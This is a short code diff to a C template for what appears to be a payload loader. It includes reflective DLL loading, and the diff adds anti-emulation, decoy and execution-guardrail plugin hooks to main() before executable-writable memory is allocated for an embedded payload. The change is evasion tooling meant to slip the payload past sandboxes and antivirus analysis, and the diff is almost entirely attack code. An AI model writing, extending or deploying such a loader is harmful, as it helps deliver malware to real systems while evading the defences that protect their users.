@@ -143,9 +143,29 @@ DWORD_PTR load_dll(LPVOID dllBytes, DWORD_PTR *ret_dllBase, DWORD *ret_aoep) {
 }
 
 
+{{plugin_antiemulation}}
+
+{{plugin_decoy}}
+
+{{plugin_executionguardrail}}
+
+
 int main()
 {
-	char* dest = VirtualAlloc(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);
+	char* dest = NULL;
+	
+	// Call: Execution Guardrail
+	if (executionguardrail() != 0) {
+		return 1;
+	}
+
+	// Call: Anti Emulation plugin
+	antiemulation();
+
+	// Call: Decoy plugin
+	decoy();
+
+	dest = VirtualAlloc(0, {{PAYLOAD_LEN}}, 0x3000, PAGE_EXECUTE_READWRITE);
 
 	// FROM supermega_payload[] 
 	// TO dest[]
